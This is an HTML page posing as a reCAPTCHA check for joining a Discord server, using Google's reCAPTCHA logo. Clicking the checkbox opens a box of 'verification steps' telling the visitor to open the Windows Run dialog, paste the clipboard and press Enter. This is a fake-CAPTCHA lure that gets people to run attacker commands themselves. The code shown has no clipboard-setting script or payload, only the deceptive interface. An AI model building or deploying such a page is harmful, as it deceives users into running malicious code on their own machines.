<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Verify To Get ACCESS To Discord Server</title>
  <style>
    body {
      background: #f2f2f2;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .captcha-box {
      width: 304px;
      height: 78px;
      background: #fff;
      border: 1px solid #d3d3d3;
      border-radius: 3px;
      display: flex;
      align-items: center;
      padding: 10px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
      position: relative;
      cursor: pointer;
    }

    .checkbox {
      width: 28px;
      height: 28px;
      border: 2px solid #ccc;
      border-radius: 2px;
      margin-right: 12px;
      position: relative;
    }

    .checkbox.checked::after {
      content: '';
      position: absolute;
      top: 3px;
      left: 8px;
      width: 8px;
      height: 14px;
      border: solid #000;
      border-width: 0 3px 3px 0;
      transform: rotate(45deg);
    }

    .captcha-text {
      flex-grow: 1;
      font-size: 16px;
      color: #222;
    }

    .captcha-logo {
      position: absolute;
      right: 10px;
      bottom: 8px;
      display: flex;
      align-items: center;
      font-size: 10px;
      color: #888;
    }

    .captcha-logo img {
      width: 20px;
      height: 20px;
      margin-left: 6px;
    }

    /* Modal */
    .modal {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: rgba(0, 0, 0, 0.6);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 999;
    }

    .modal-content {
      background: #fff;
      width: 360px;
      padding: 20px;
      border-radius: 6px;
      box-shadow: 0 0 20px rgba(0,0,0,0.2);
    }

    .modal-content h2 {
      color: #007bff;
      margin-bottom: 10px;
    }

    .modal-content ol {
      padding-left: 20px;
      margin-bottom: 15px;
    }

    .modal-content ol li {
      margin-bottom: 10px;
    }

    .modal-content strong {
      font-weight: bold;
    }

    .green-check {
      color: green;
      font-size: 12px;
    }

    .verify-btn {
      background: #007bff;
      color: white;
      border: none;
      padding: 8px 20px;
      font-size: 14px;
      border-radius: 4px;
      cursor: pointer;
      float: right;
    }

    .close-btn {
      float: right;
      font-size: 20px;
      font-weight: bold;
      cursor: pointer;
      color: #aaa;
    }

    .close-btn:hover {
      color: #000;
    }
  </style>
</head>
<body>

<div class="captcha-box" onclick="openModal()">
  <div class="checkbox" id="checkbox"></div>
  <div class="captcha-text">I'm not a robot</div>
  <div class="captcha-logo">
    reCAPTCHA
    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
  </div>
</div>

<div class="modal" id="captchaModal">
  <div class="modal-content">
    <span class="close-btn" onclick="closeModal()">&times;</span>
    <h2>Complete these <strong>Verification Steps</strong></h2>
    <p>To better prove you are not a robot, please:</p>
    <ol>
      <li><strong>Press & hold</strong> the Windows Key <kbd>⊞</kbd> + <kbd>R</kbd></li>
      <li>In the verification window, press <strong>Ctrl + V</strong></li>
      <li>Press <strong>Enter</strong> on your keyboard to finish.</li>
    </ol>
    <p class="green-check">✅ "I am not a robot - reCAPTCHA Verification ID: 8883"</p>
    <button class="verify-btn" onclick="closeModal()">VERIFY</button>
  </div>
</div>

<script>
  function openModal() {
    document.getElementById('captchaModal').style.display = 'flex';
    document.getElementById('checkbox').classList.add('checked');
  }

  function closeModal() {
    document.getElementById('captchaModal').style.display = 'none';
  }
</script>

</body>
</html>
